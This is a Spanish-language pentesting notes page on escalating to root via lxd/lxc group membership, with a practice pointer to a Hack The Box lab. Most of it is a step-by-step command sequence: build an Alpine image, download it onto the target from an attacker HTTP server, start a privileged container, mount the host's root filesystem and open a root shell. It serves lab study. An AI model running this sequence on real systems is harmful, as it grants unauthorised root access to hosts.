---
description: Podemos encontrarlo tras haber hecho "id" a nuestro usuario actual
---

# Grupo lxd/lxc

## Introducción

Es un contenedor de sistema y administrador de máquinas virtuales. Al usarlo se pueden administrar las instancias con una herramienta de línea de comandos.

{% embed url="https://linuxcontainers.org/lxd/introduction" %}
URL de información sobre LXD
{% endembed %}

## Explotación

En nuestra máquina:

```
#Instalamos las dependencias
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools

#Clonamos el repositorio de Github y lo montamos
git clone https://github.com/lxc/distrobuilder
cd distrobuilder
make

#Creamos un directorio donde descargaremos alpine.yaml y lo montamos.
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

#Montamos un servidor con Python para enviar los archivos a la máquina atacada
python3 -m http.server
```

En la máquina objetivo:

```
#Obtenemos los dos archivos que nos interesan
wget http://10.10.16.32:8000/lxd.tar.xz
wget http://10.10.16.32:8000/rootfs.squashfs

#Los importamos con lxc
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

#Podemos mostrarlo para comprobar que está todo ok
lxc image list
+--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               |  ARCH  |  SIZE  |          UPLOAD DATE          |
+--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
| alpine | 8ecef12822d7 | no     | Alpinelinux 3.8 x86_64 (20211213_0958) | x86_64 | 1.92MB | Dec 13, 2021 at 10:11am (UTC) |
+--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+

#Cambiamos security.privileged a true
lxc init alpine privesc -c security.privileged=true

#Configuramos y montamos todo en /mnt/root
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

#Iniciamos y ejecutamos una consola cómo root
lxc start privesc
lxc exec privesc /bin/sh
```

## Practicar

* Máquina "[included](../../../HTB/included.md#tftp)" de HTB \[Acceso 13/12/2021]

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
